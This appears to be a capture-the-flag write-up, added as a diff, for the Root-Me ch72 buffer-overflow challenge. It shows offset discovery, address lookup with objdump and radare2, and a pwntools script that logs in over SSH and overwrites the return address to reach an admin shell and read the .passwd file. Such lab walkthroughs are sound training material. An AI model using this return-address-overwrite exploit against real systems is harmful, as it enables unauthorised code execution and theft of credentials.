@@ -1,0 +1,89 @@
+This write-up shows HOW I got to the point of creating my POC. 
+
+Steps
+------
+0. Routine for finding the overflow:
+
+    [code]python -c 'print "A" * 32' | strace ./ch72exe
+    - Confirmed 0x41414141
+    pattern_create -l 32
+    pattern_offset -q
+    python -c 'print "A" 24 + "B" * 4' | strace ./ch72.exe[code]
+    - Confirmed 0x42424242
+
+1. Now, we need to jump to _admin_shell(). Notice when you start ch72.exe w/ GDB and 
+you try to view all the functions with "info functions" there are none:
+
+    (gdb) file test
+    Reading symbols from test...(no debugging symbols found)...done.
+
+     - This means they did not compile it with debugging symbols (gcc -g)
+     - "-g" debugging option includes symbol names including other data.
+
+     [code]# objdump -D -M intel ./ch72.exe  | grep 'main'[/code]
+     - No Result
+
+2. Now that we don't see any symbols/names on functions. Let check out ch72.obj. We can find
+    functions and their location relative to each other.
+
+     [code]# objdump -D -M intel ./ch72.exe  | grep 'main'
+     - 00000020 <_main>:
+     # objdump -D -M intel ./ch72.exe  | grep 'admin'
+     - 00000000 <_admin_shell>:[/code]
+
+     [main() @ 0x20] - [_admin_shell() @ 0x00] = 32 bytes difference (Remember this)
+
+3. Looking for a run-time address routine:
+  
+    [code]# radare2 ./ch72.exe
+    # 0x00401347]> aaa                                                            
+Analyze all flags starting with sym. and entry0 (aa)
+Analyze function calls (aac)                                    
+Analyze len bytes of instructions for references (aar)
+Constructing a function name for fcn.* and sym.func.* functions (aan)
+Type matching analysis for all functions (afta)[/code]
+
+    - After analyzing symbols I searched for function names.
+
+    [code]# [0x00401347]> afll | grep main                                               
+0x00401020  113     5     5     2   53 0x00401020   113 0x00401091     3    7    1    1    32 main[/code]
+
+    - We now have the run-time REAL address of main(). 
+    - NOTE: GDB adds 32 bytes on top due to ENV differences.
+
+gdb_main = 0x00401040
+main =  0x00401020
+_admin_shell = 0x00401000
+
+4. Exploit
+
+- We got EIP overwrite.
+- We have main() real address.
+- We know there's a 32 byte difference from main() to _admin_shell().
+ 0x00401020 - 0x00401000 = 32 bytes difference
+ main()             _admin_shell()
+
+Let's put it together:
+
+[code]from pwn import *
+
+#context.terminal = ['tmux', 'splitw', '-h']
+context.os = 'windows'
+
+s = ssh('app-systeme-ch72', 'challenge05.root-me.org', password='app-systeme-ch72', port=2225)
+p = s.process('/challenge/app-systeme/ch72/./wrapper.sh')
+
+#gdb.attach(p, 'break main')
+#p = gdb.debug("./ch72.exe", ssh=s)
+
+
+payload = ""
+payload += "A" * 24
+payload += "\x00\x10\x40\x00"
+
+p.sendline(payload)
+p.interactive()[/code]
+
+
+ps - When this exploit is directed towards ch72.exe it doesn't have the perms to 'cat .passwd'. Direct it 
+towards the wrapper.sh and it will pass the exploit to ch72.exe.
